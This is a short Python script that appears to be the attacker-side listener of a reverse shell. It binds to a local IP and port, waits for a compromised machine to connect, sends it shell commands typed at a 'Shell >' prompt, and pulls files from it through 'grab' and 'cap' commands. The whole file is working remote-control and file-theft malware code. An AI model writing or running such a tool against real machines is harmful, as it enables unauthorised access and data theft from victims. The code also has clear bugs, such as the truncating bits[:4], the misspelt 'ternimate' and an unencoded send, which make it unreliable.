import socket

HOST_NAME = "192.168.43.129"
PORT_NAME = 8080

def transfer(conn,command):
    conn.send(command.encode())
    grab , path = command.split("*")
    f = open(path,'wb')
    while True :
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()) :
            f.write(bits[:4])
            f.close()
            break 
        f.write(bits)

def connect():
    s = socket.socket()
    s.bind((HOST_NAME, PORT_NAME))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] We got connection from ", addr)

    while True:
        command = input("Shell > ")

        if 'terminate' in command:
            conn.send("ternimate".encode())
        
        if 'grab' in command:
            transfer(conn,command)

        if 'cd' in command: 
            conn.send(command)
        if 'cap' in command:
            transfer(conn,command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


def main():
    connect()


main()
